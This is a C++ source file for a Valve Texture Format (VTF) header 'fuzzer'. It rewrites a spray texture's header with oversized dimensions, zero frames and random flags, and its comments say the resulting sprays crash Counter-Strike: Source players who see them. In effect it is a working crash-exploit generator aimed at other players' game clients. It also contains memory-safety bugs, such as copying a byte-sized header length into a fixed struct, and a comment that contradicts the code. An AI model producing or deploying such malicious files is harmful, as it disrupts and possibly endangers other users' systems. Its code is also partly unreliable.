#include <exception>
#include <fstream>
#include <string>
#include <iostream>
#include <algorithm>
#include <vector>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <math.h>

/*
    vtf header fuzzer
    can cause crashes when players see sprays produced by this program
    https://github.com/destoer/vtf_fuzzer

*/


//https://developer.valvesoftware.com/wiki/Valve_Texture_Format
enum TextureFormat
{
	IMAGE_FORMAT_NONE = -1,
	IMAGE_FORMAT_RGBA8888 = 0,
	IMAGE_FORMAT_ABGR8888,
	IMAGE_FORMAT_RGB888,
	IMAGE_FORMAT_BGR888,
	IMAGE_FORMAT_RGB565,
	IMAGE_FORMAT_I8,
	IMAGE_FORMAT_IA88,
	IMAGE_FORMAT_P8,
	IMAGE_FORMAT_A8,
	IMAGE_FORMAT_RGB888_BLUESCREEN,
	IMAGE_FORMAT_BGR888_BLUESCREEN,
	IMAGE_FORMAT_ARGB8888,
	IMAGE_FORMAT_BGRA8888,
	IMAGE_FORMAT_DXT1,
	IMAGE_FORMAT_DXT3,
	IMAGE_FORMAT_DXT5,
	IMAGE_FORMAT_BGRX8888,
	IMAGE_FORMAT_BGR565,
	IMAGE_FORMAT_BGRX5551,
	IMAGE_FORMAT_BGRA4444,
	IMAGE_FORMAT_DXT1_ONEBITALPHA,
	IMAGE_FORMAT_BGRA5551,
	IMAGE_FORMAT_UV88,
	IMAGE_FORMAT_UVWQ8888,
	IMAGE_FORMAT_RGBA16161616F,
	IMAGE_FORMAT_RGBA16161616,
	IMAGE_FORMAT_UVLX8888
};



struct tagVTFHEADER
{
	char		signature[4];		// File signature ("VTF\0"). (or as little-endian integer, 0x00465456)
	unsigned int	version[2];		// version[0].version[1] (currently 7.2).
	unsigned int	headerSize;		// Size of the header struct  (16 byte aligned; currently 80 bytes) + size of the resources dictionary (7.3+).
	unsigned short	width;			// Width of the largest mipmap in pixels. Must be a power of 2.
	unsigned short	height;			// Height of the largest mipmap in pixels. Must be a power of 2.
	unsigned int	flags;			// VTF flags.
	unsigned short	frames;			// Number of frames, if animated (1 for no animation).
	unsigned short	firstFrame;		// First frame in animation (0 based).
	unsigned char	padding0[4];		// reflectivity padding (16 byte alignment).
	float		reflectivity[3];	// reflectivity vector.
	unsigned char	padding1[4];		// reflectivity padding (8 byte packing).
	float		bumpmapScale;		// Bumpmap scale.
	unsigned int	highResImageFormat;	// High resolution image format.
	unsigned char	mipmapCount;		// Number of mipmaps.
	unsigned int	lowResImageFormat;	// Low resolution image format (always DXT1).
	unsigned char	lowResImageWidth;	// Low resolution image width.
	unsigned char	lowResImageHeight;	// Low resolution image height.

	// 7.2+
	unsigned short	depth;			// Depth of the largest mipmap in pixels.
						            // Must be a power of 2. Is 1 for a 2D texture.
};

template<typename T>
void read_file(const std::string &filename, T *buf, size_t size)
{
    std::ifstream fp(filename,std::ios::binary);

    if(!fp)
    {
        auto err = "failed to open file: " + filename;
        std::cout << err;
        exit(1);
    }

    fp.read(reinterpret_cast<char*>(buf),size);

}


template<typename T>
void write_file(const std::string &filename, const T *data,size_t size)
{
    std::ofstream fp(filename,std::ios::binary);
	fp.write(reinterpret_cast<const char*>(data),size);
    fp.close();
}

size_t get_file_size(const std::string &filename)
{
    std::ifstream fp(filename);
    fp.seekg(0,fp.end);
	return fp.tellg();
}


bool is_set(int flag, int bit)
{
    return (flag >> bit) & 1;
}

int set_bit(int flag,int bit) noexcept
{
    return flag | (1 << bit);
}

int deset_bit(int flag,int bit) noexcept
{
    return flag & ~(1 << bit);
}

template<typename T>
bool in_range(T v, T l, T h)
{
    return (v <= h && v >= l);
}

int main(int argc,char *argv[])
{
    if(argc != 2)
    {
        printf("usage: %s <vtf file to inspect>",argv[0]);
    }

    const std::string filename = argv[1];

    std::vector<uint8_t> buf;

    buf.resize(get_file_size(filename));

    read_file(filename,buf.data(),buf.size());

    if(buf.size() < 0x50)
    {
        puts("file too small");
        exit(1);
    }

    auto header_size = buf[0xc];

    if(header_size > buf.size())
    {
        puts("file too small");
        exit(1);
    }

    tagVTFHEADER vtf_header;
    memset(&vtf_header,0,sizeof(tagVTFHEADER));

    memcpy(&vtf_header,buf.data(),header_size);



    // print our header
    printf("file size: %d\n",buf.size());
    printf("Magic: %s\n",vtf_header.signature);
    printf("version %d.%d\n",vtf_header.version[0],vtf_header.version[1]);
    printf("header size %d\n",vtf_header.headerSize);
    printf("width %d\n",vtf_header.width);
    printf("height %d\n",vtf_header.height);
    printf("flags: %08x\n",vtf_header.flags);
    printf("frames %d\n",vtf_header.frames);
    printf("first frame %d\n",vtf_header.firstFrame);
    printf("reflectivity %f %f %f\n",vtf_header.reflectivity[0],vtf_header.reflectivity[1],vtf_header.reflectivity[2]);
    printf("bumpmapscale: %f\n",vtf_header.bumpmapScale);
    printf("highresimagefmt: %d\n",vtf_header.highResImageFormat);
    printf("mipmapcount %d\n",vtf_header.mipmapCount);
    printf("lowresimagefmt: %d\n",vtf_header.lowResImageFormat);
    printf("lowreswidth: %d\n",vtf_header.lowResImageWidth);
    printf("lowresheight: %d\n",vtf_header.lowResImageHeight);
    printf("depth: %d\n",vtf_header.depth);


    printf("point sampling: %d\n",is_set(vtf_header.flags,0));
    printf("trilinear sampling: %d\n",is_set(vtf_header.flags,1));
    printf("clamp s: %d\n",is_set(vtf_header.flags,2));
    printf("clamp t: %d\n",is_set(vtf_header.flags,3));
    printf("anisotropic sampling: %d\n",is_set(vtf_header.flags,4));
    printf("hint dxt5: %d\n",is_set(vtf_header.flags,5));
    printf("unknown: %d\n",is_set(vtf_header.flags,6));
    printf("normal map: %d\n",is_set(vtf_header.flags,7));
    printf("no mipmaps: %d\n",is_set(vtf_header.flags,8));
    printf("no level of detail: %d\n",is_set(vtf_header.flags,9));
    printf("no min mipmap: %d\n",is_set(vtf_header.flags,10));
    printf("procedural: %d\n",is_set(vtf_header.flags,11));
    printf("one bit alpha: %d\n",is_set(vtf_header.flags,12));
    printf("eight bit alpha: %d\n",is_set(vtf_header.flags,13));
    printf("env map: %d\n",is_set(vtf_header.flags,14));
    printf("render target: %d\n",is_set(vtf_header.flags,15));
    printf("depth render target: %d\n",is_set(vtf_header.flags,16));
    printf("no debug override: %d\n",is_set(vtf_header.flags,17));
    printf("single copy: %d\n",is_set(vtf_header.flags,18));
    printf("pre srgb: %d\n",is_set(vtf_header.flags,19));
    printf("premultiply color by one over mipmap level: %d\n",is_set(vtf_header.flags,20));
    printf("normal to dudv: %d\n",is_set(vtf_header.flags,21));
    printf("alpha test mipmap generation: %d\n",is_set(vtf_header.flags,22));
    printf("no depth buffer: %d\n",is_set(vtf_header.flags,23));
    printf("nice filtered: %d\n",is_set(vtf_header.flags,24));
    printf("clamp u: %d\n",is_set(vtf_header.flags,25));
    printf("vertex texture: %d\n",is_set(vtf_header.flags,26));
    printf("ssbump: %d\n",is_set(vtf_header.flags,27));
    printf("border: %d\n",is_set(vtf_header.flags,29));


    // a zerod out header will happily be loaded
    // even if the console complains about it a little 
    // on counter strike source
    // and will cause crashes

    // new header size + old file data
    std::vector<uint8_t> out_vec(0x50 + buf.size()-header_size);

    tagVTFHEADER new_header;
    memcpy(&new_header,&vtf_header,sizeof(tagVTFHEADER));

    // standard header stuff
    new_header.version[0] = 7; new_header.version[1] = 2;
    new_header.headerSize = 0x50;
    strcpy(new_header.signature,"VTF");

    //new_header.width = rand();
    //new_header.height = rand();

    // width and height must be from 0 to 8192
    // not limiting them seems to give nice effects
    // like it reading out of memory form god knows where
    new_header.width %= 8192;
    new_header.height %= 8192;

    new_header.width = 4;
    new_header.height = 18464;

    // DXT compressed textures must be a multiple of 4
    // cheers ficool2
    if(in_range<int>(new_header.highResImageFormat,IMAGE_FORMAT_DXT1,IMAGE_FORMAT_DXT5))
    {
        new_header.width &= ~3;
        new_header.height &= ~3;
    }

    new_header.bumpmapScale = 0.0;
    //new_header.bumpmapScale = rand();
    for(int i = 0; i < 3; i++)
    {
        new_header.reflectivity[i] = 0.0;
        //new_header.reflectivity[i] = rand();
    }


    // i think these should be between 0 and 1.0 but im not 100% sure
    new_header.bumpmapScale = fmod(new_header.bumpmapScale,1.0);
    for(int i = 0; i < 3; i++)
    {
        new_header.reflectivity[i] = fmod(new_header.reflectivity[i],1.0);
    }

    // atm i dont wanna have to format the data following the 
    // header so its valid for multiple frames so force to 1 for now
    // note having zero frames appears to cause crashes in otherwhise valid sprays..
    new_header.frames = 0; 

    new_header.flags = rand() % (1 << 30);


    new_header.mipmapCount = rand();
    new_header.depth = 1; // 2d texture

    //new_header.lowResImageFormat = IMAGE_FORMAT_DXT1;

    // randomizing this one is likely to cause it to reject are spray
    // we need to fiddle the spray data if we want to do this
    // *** Error unserializing VTF file... is the file empty?
    //new_header.highResImageFormat = rand() % (IMAGE_FORMAT_UVLX8888 + 1);

    memcpy(out_vec.data(),&new_header,sizeof(tagVTFHEADER));
    memcpy(out_vec.data()+0x50,buf.data()+header_size,buf.size()-header_size);

    write_file("test.vtf",out_vec.data(),out_vec.size());
    puts("wrote file!");
}